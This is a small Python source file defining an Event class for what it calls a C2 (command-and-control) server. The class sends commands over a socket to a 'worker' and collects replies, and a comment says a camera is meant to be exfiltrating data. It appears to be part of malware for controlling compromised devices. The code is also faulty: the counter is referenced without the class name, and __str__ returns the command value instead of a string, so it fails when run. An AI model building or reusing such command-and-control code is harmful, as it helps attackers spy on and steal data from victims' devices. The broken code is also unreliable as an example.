import socket 

class Event:
    event_counter = 0
    def __init__(self, event):
        self.executed = False
        self.event = event
        self.response = b''
        self.id = event_counter
        event_counter += 1
        return
    
    def run(self, wk_socket : socket.socket):
        if not self.executed:
            # Send the command to the worker.
            print(f'[Event {self.id} ~ Command] C2 -> {self.__str__()}: "{self.event}"')
            wk_socket.send(self.event)

            # Store the result.
            
            # TODO: The camera should be exfiltrating some format which is not plaintext.
            # We'll have to parse it here.
            # For now, there is a simple function which just gets the data, as if it was stored in plaintext. 
            while (data := wk_socket.recv(0x100)) != b'':
                self.response += data
            print(f'[Event {self.id} ~ Response] {self.__str__()} -> C2: "{self.response}"')
            
            # Mark as executed (so we don't accidentally run it twice).
            self.executed = True

    def __str__(self):
        return self.event
    
